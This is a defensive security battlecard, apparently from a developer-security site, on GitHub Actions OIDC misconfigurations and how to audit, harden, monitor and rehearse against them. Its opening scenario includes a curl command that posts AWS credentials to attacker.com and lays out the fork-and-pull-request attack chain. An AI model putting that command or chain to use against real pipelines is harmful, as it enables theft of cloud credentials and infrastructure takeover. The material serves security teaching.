---
 permalink: /battlecards/github-oidc-misconfiguration
 
battlecard:
 title: GitHub OIDC Misconfiguration
 category: CI/CD
 scenario: GitHub/OIDC CI Misconfig
 focus: 
   - overly broad trust policies 
   - secret exposure to forks 
   - unpinned reusable workflows 
---

An attacker identifies a popular open-source project on GitHub that uses GitHub Actions and OIDC to automate deployments to a cloud provider like AWS. By inspecting the `.github/workflows` directory, they discover several misconfigurations:

1.  **Overly Broad Trust Policy:** The AWS IAM role's trust policy allows any workflow from any branch within the organization's GitHub repository (`"repo:my-cool-org/*:*"`) to assume the role.
2.  **Unpinned Reusable Workflow:** The main CI workflow calls a reusable deployment workflow using a floating reference, like `uses: my-cool-org/reusable-workflows/.github/workflows/deploy.yml@main`.
3.  **Vulnerable Trigger:** The workflow is configured to run on `pull_request_target`, which allows it to run with access to the target repository's secrets even when triggered by a pull request from a fork.

The attacker forks the project's `reusable-workflows` repository. They modify the `deploy.yml` workflow on their fork's `main` branch to include a step that exfiltrates any available AWS credentials to their own server (`curl -X POST -d "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY" http://attacker.com/log`).

Next, the attacker opens a trivial pull request in the main application repository (e.g., fixing a typo in the README). Because the main workflow runs on `pull_request_target` and uses the unpinned `@main` reference for the reusable workflow, GitHub Actions pulls the attacker's malicious version of `deploy.yml`. The overly broad OIDC trust policy allows the malicious workflow to successfully assume the AWS role. The attacker's code executes, stealing the cloud credentials and giving them direct access to the project's cloud infrastructure.

{% block type='battlecard' text='Reconnaissance' %}
### Explanation
Attackers don't typically brute-force their way in; they look for open doors. In this scenario, they act like opportunistic auditors, scanning public repositories for common CI/CD misconfigurations. They use specialized search queries on GitHub to find projects using OIDC with cloud providers. They analyze workflow files (`.yml`) to understand your automation, looking for weak triggers like `pull_request_target`, broad OIDC permission claims, and reusable workflows that aren't "pinned" to a specific, immutable version. Their goal is to understand your deployment process well enough to trick it into running their code with your permissions.

### Insight
The attacker is exploiting the trust you've placed in your own automation. The very tools you use for speed and consistency can be turned against you if not configured with a security-first mindset. For an attacker, a `.github/workflows` directory is a treasure map showing exactly how you build, test, and deploy code, and where the treasure (your secrets and infrastructure) is buried.

### Practical
Use GitHub's search functionality to see your organization as an attacker would. Search within your org for files containing keywords that indicate high-risk configurations.
*   `path:.github/workflows pull_request_target`
*   `path:.github/workflows id-token: write`
*   `uses: your-org/your-repo/.github/workflows/*.yml@main`

Review the search results and ask: "Could an outsider's code run in this workflow? What permissions would it get?"

### Tools/Techniques
*   **GitHub Code Search:** Use advanced search operators (`path:`, `org:`, `language:`) to find potentially vulnerable workflow files across your organization. [GitHub's search documentation](https://docs.github.com/en/search-github/searching-on-github/searching-code) is a great resource.
*   **Gitleaks:** An open-source tool to scan git repositories for hardcoded secrets, which can also be configured with custom rules to find patterns like insecure workflow triggers. [Gitleaks on GitHub](https://github.com/gitleaks/gitleaks).
*   **TruffleHog:** Scans repositories for secrets and can help identify sensitive information exposed in your git history. [TruffleHog on GitHub](https://github.com/trufflesecurity/trufflehog).

### Metrics/Signal
*   Number of public repositories in your organization with visible `.github/workflows` directories.
*   Count of workflows using the `pull_request_target` trigger.
*   Percentage of reusable workflow `uses:` clauses pointing to a floating reference (`@main`, `@dev`) instead of a specific tag or commit hash.

{% endblock %}
{% block type='battlecard' text='Evaluation' %}
### Explanation
This stage is about self-auditing your CI/CD processes before an attacker does. You need to assess how your GitHub Actions workflows authenticate with your cloud provider and what permissions they receive. A developer can check for vulnerability by reviewing the OIDC trust relationship configured in the cloud (e.g., the Trust Policy on an AWS IAM Role). Does it trust any branch (`"repo:my-org/*:*"`), or does it specify only the production branch (`"repo:my-org/my-app:ref:refs/heads/main"`)? Inside your workflow files, check the `permissions` block. Is `id-token: write` present? Finally, examine all `uses:` statements that refer to reusable workflows. Are they pinned to a specific commit hash (`@<sha>`) or a tag (`@v1.2.3`)?

### Insight
A vulnerability here is rarely a single mistake but a chain of them. An overly broad OIDC trust policy might seem low-risk on its own. However, when combined with an unpinned, reusable workflow triggered by a pull request from a fork, it becomes a critical security hole. You must evaluate the entire chain of trust, from the trigger to the cloud permissions.

### Practical
Perform a manual audit. Pick one critical repository and map its entire deployment process:
1.  **Trigger:** How does the workflow start? (`on: push`, `on: pull_request_target`, etc.)
2.  **Authentication:** How does it get credentials? (Look for `id-token: write`).
3.  **Authorization:** Go to your cloud provider's console (e.g., AWS IAM) and find the role the workflow assumes. Scrutinize its trust policy and its permission policies. Ask, "What's the absolute worst an attacker could do with these permissions?"
4.  **Dependencies:** Check all `uses:` statements. Are they pinned to a specific, immutable version?

### Tools/Techniques
*   **OpenSSF Scorecard:** An automated tool that checks for a series of security best practices on open-source projects, including pinned dependencies. [OpenSSF Scorecard on GitHub](https://github.com/ossf/scorecard).
*   **StepSecurity Harden-Runner:** A GitHub Action that analyzes your workflows and provides security hardening recommendations, including egress traffic monitoring and runtime security. [StepSecurity Harden-Runner](https://github.com/step-security/harden-runner).
*   **Cloud Provider Consoles:** Use the AWS, GCP, or Azure web consoles to directly inspect the trust policies of IAM Roles, Workload Identities, or Service Principals.

### Metrics/Signal
*   Percentage of IAM roles used by GitHub OIDC that have specific repository and branch/tag conditions in their trust policies.
*   A score from OpenSSF Scorecard, specifically looking at the "Pinned-Dependencies" check.
*   Number of workflows requesting `id-token: write` permissions that don't deploy to a production environment.

{% endblock %}
{% block type='battlecard' text='Fortify' %}
### Explanation
Hardening your CI/CD pipeline means enforcing the principle of least privilege at every step. Your goal is to make your configuration so specific that only the intended code, from the intended branch, triggered by the intended event, can assume the intended role. This involves tightening your cloud provider's OIDC trust policy to only allow access from specific repositories and branches (e.g., `repo:my-org/my-repo:ref:refs/heads/main`). It also means pinning reusable workflows to a full-length commit SHA (`uses: org/repo/.github/workflows/deploy.yml@f2c1b2f...`), which is immutable and prevents an attacker from hijacking the reference.

### Insight
Pinning to a commit SHA is significantly more secure than pinning to a tag (like `@v1.2.3`). A git tag is a mutable pointer and can be moved by an attacker who gains control of the source repository. A commit SHA is a permanent, unique identifier for a specific version of the code, making it a much more reliable trust anchor in your software supply chain.

### Practical
1.  **Tighten OIDC Policies:** Edit your cloud IAM role's trust policy. Replace wildcard subjects with specific ones. Use conditions to restrict access to a single repository and a protected branch or tag pattern.
*   **Example (AWS IAM):**
```json
"Condition": {
"StringEquals": {
"token.actions.githubusercontent.com:sub": "repo:my-org/my-app:ref:refs/heads/main"
}
}
```
2.  **Pin Your Workflows:** Go through all your `.github/workflows/*.yml` files. For every `uses:` statement that calls a reusable workflow, find the latest stable commit hash for that workflow and replace `@main` or `@v1` with the full SHA.
3.  **Use Environments:** Configure GitHub Environments for deployments. You can add protection rules, such as requiring a manual approval step before a workflow can access an environment's secrets and proceed with a production deployment.

### Tools/Techniques
*   **GitHub Environments:** Use protection rules to gate deployments to sensitive environments, requiring manual approval. [GitHub Docs on Environments](https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment).
*   **Infrastructure as Code (IaC):** Manage your cloud IAM policies using tools like [Terraform](https://www.terraform.io/) or [AWS CloudFormation](https://aws.amazon.com/cloudformation/). This allows you to codify, version, and peer-review your OIDC trust policies.
*   **Dependabot:** While often used for library updates, you can use similar principles to create alerts or automated PRs when the pinned SHA of a reusable workflow is out of date.

### Metrics/Signal
*   100% of production IAM roles have OIDC trust policies restricted to a specific repository and protected branch/tag.
*   Code scanning or linting rule that fails any PR adding a reusable workflow `uses:` clause that is not pinned to a commit SHA.
*   Number of production deployments gated by a GitHub Environment with a manual approver.

{% endblock %}
{% block type='battlecard' text='Limit' %}
### Explanation
Even with the best defenses, you must assume a breach is possible. Limiting the blast radius is about ensuring that if an attacker successfully steals credentials, the amount of damage they can do is minimal. The credentials obtained via OIDC should only have the permissions necessary to perform the specific task of that CI job, and nothing more. For example, a role for publishing a container image should only have permissions to push to your container registry (e.g., Amazon ECR) and not to read from S3 buckets or modify databases. GitHub's OIDC provides short-lived credentials by default, which is a great starting point, but the permissions attached to them are what truly defines your blast radius.

### Insight
This is the "defense in depth" principle applied to CI/CD. Your first layer of defense is preventing the credential theft (Fortify). Your second layer is minimizing the value of those credentials if they are stolen. A common mistake is creating a single, powerful `ci-cd-role` for all tasks. A better practice is to have multiple, fine-grained roles for each distinct task (e.g., `build-role`, `test-data-reader-role`, `deploy-to-prod-role`).

### Practical
*   **Decompose IAM Roles:** Review your CI/CD IAM roles. If a single role is used for building, testing, and deploying, break it into smaller roles with fewer permissions. Use different roles for different environments (dev vs. prod).
*   **Implement Network Controls:** Where possible, restrict the network access of your CI/CD runners. For example, use VPC endpoints in AWS so that your runner can only access specific AWS services (like S3 or ECR) and cannot reach the public internet or your production databases.
*   **Scope Credentials to the Job:** In your GitHub workflow, request permissions for each job separately. A build job doesn't need deployment credentials, so don't give it access to them.

### Tools/Techniques
*   **AWS IAM Access Analyzer:** A service that helps you identify and remove excessive permissions by analyzing access patterns. [AWS IAM Access Analyzer](https://aws.amazon.com/iam/features/access-analyzer/).
*   **Cloud-specific Network Controls:** Use tools like [AWS VPC Endpoints](https://docs.aws.amazon.com/vpc/latest/privatelink/vpc-endpoints.html), [GCP VPC Service Controls](https://cloud.google.com/vpc-service-controls), or [Azure Private Link](https://azure.microsoft.com/en-us/products/private-link) to lock down network paths.
*   **Open Policy Agent (OPA):** Can be used to write policies that enforce rules on your IAM configurations, for example, "no CI role can have `*` in its resource permission." [Open Policy Agent](https://www.openpolicyagent.org/).

### Metrics/Signal
*   Average number of permissions per CI/CD IAM role (lower is better).
*   Critical services (e.g., production databases) have network policies that deny access from the IP ranges of CI/CD runners.
*   Percentage of CI/CD jobs that use a role with permissions scoped only to that job's needs.

{% endblock %}
{% block type='battlecard' text='Expose' %}
### Explanation
To detect an attack, you need visibility into what your CI/CD process is doing, especially in the cloud. Detection focuses on monitoring for anomalies. If your CI/CD role, which normally only pushes to a container registry, suddenly attempts to list all your S3 buckets (`s3:ListAllMyBuckets`) or spin up an EC2 instance, that's a massive red flag. You need to ingest logs from your cloud provider (like AWS CloudTrail) and GitHub's audit logs into a system that can alert on such suspicious behavior. The signal of an attack is often not in the CI/CD system itself, but in how the stolen credentials are used in your cloud environment.

### Insight
The key is to establish a baseline of normal behavior. Your CI/CD system is predictable; it should perform the same set of actions every time it runs. Any deviation from this baseline is a potential indicator of compromise. Logging and alerting are not just for production applications; they are critical for your development infrastructure as well.

### Practical
1.  **Enable and Centralize Logs:** Ensure audit logging is enabled everywhere: GitHub organization audit logs, and cloud provider logs (AWS CloudTrail, Google Cloud Audit Logs, Azure Monitor). Ship these logs to a central location.
2.  **Create Specific Alerts:** Configure alerts for high-risk, anomalous behavior. For example:
*   Alert if the CI/CD IAM role is used from an unexpected IP address or region.
*   Alert if the CI/CD role performs a sensitive, non-standard action (e.g., `iam:CreateUser`, `kms:Decrypt`).
*   Alert if a workflow file (`.github/workflows/*.yml`) is modified in a PR from a first-time contributor.

### Tools/Techniques
*   **Cloud Provider Logging:** [AWS CloudTrail](https://aws.amazon.com/cloudtrail/), [Google Cloud Audit Logs](https://cloud.google.com/logging/docs/audit), [Azure Monitor](https://azure.microsoft.com/en-us/products/monitor).
*   **SIEM and Monitoring Platforms:** Tools like [Datadog](https://www.datadoghq.com/), [Splunk](https://www.splunk.com/), or [Sumo Logic](https://www.sumologic.com/) can ingest logs from multiple sources, establish baselines, and create sophisticated correlation alerts.
*   **GitHub Audit Log Streaming:** For enterprise customers, GitHub allows streaming the audit log to an external data management system, enabling near real-time monitoring of org-level activity. [GitHub Docs on Log Streaming](https://docs.github.com/en/enterprise-cloud@latest/admin/monitoring-activity-in-your-enterprise/reviewing-audit-logs-for-your-enterprise/streaming-the-audit-log-for-your-enterprise).

### Metrics/Signal
*   Alerts firing for anomalous API calls made by a CI/CD role in your cloud environment.
*   A spike in `git.clone` or `artifact.download` events in the GitHub audit log from unexpected users or automation.
*   Mean Time to Detect (MTTD): How long does it take from the moment a malicious workflow runs to the moment a security alert is generated?

{% endblock %}
{% block type='battlecard' text='eXercise' %}
### Explanation
To build muscle memory and test your defenses, you must practice responding to this attack scenario in a controlled way. This involves running security exercises, also known as "game days" or "red team exercises." The goal is to simulate the attack and see if your defenses (Fortify), blast radius controls (Limit), and monitoring (Expose) work as expected. This isn't about blaming individuals; it's about finding and fixing weaknesses in your systems, processes, and team readiness before a real attacker does.

### Insight
The most valuable part of an exercise is not proving that your defenses work, but discovering the surprising ways they fail. Perhaps your alert fired, but it went to the wrong Slack channel. Or maybe you detected the breach but didn't have a clear, documented runbook for revoking the compromised credentials. These are the gaps you want to find and fix during a drill, not a real incident.

### Practical
1.  **Tabletop Exercise:** Gather the development team and walk through the scenario verbally. "A new contributor opens a PR. A security alert fires saying our CI role just tried to list all S3 buckets. What do we do, step-by-step? Who is responsible for what?"
2.  **Live Fire Exercise (in a safe environment):** Create a sandboxed cloud account and a non-production repository. Deliberately introduce the misconfigurations (broad OIDC trust, unpinned workflow). Have a team member play the role of the attacker and create a malicious PR that attempts to exfiltrate a fake secret. See if your monitoring detects it and if the team can follow the response plan.
3.  **Document and Improve:** After each exercise, document what went well and what didn't. Turn the findings into actionable tickets to improve tooling, update documentation, and train the team.

### Tools/Techniques
*   **Internal Wikis:** Use tools like [Confluence](https://www.atlassian.com/software/confluence) or [Notion](https://www.notion.so/) to create and maintain incident response runbooks. The runbook for this scenario should include steps like: how to identify the malicious workflow run, how to disable the IAM role, and how to audit for malicious activity.
*   **ChatOps:** Integrate your incident response process with tools like [Slack](https://slack.com/) or [Microsoft Teams](https://www.microsoft.com/en-us/microsoft-teams/group-chat-software). Automated bots can create incident channels, pull in the right people, and post links to runbooks.
*   **Threat Modeling Frameworks:** Use frameworks like [STRIDE](https://learn.microsoft.com/en-us/azure/security/develop/threat-modeling-tool-threats) to think systematically about threats to your CI/CD process during the design phase, which can help you create more realistic exercise scenarios.

### Metrics/Signal
*   Mean Time to Respond (MTTR): In an exercise, how long does it take from the moment the alert fires to the moment the compromised credentials are revoked and the threat is contained?
*   Percentage of developers who have participated in a security exercise in the past 12 months.
*   Number of actionable improvement tickets generated from the most recent security exercise.
{% endblock %}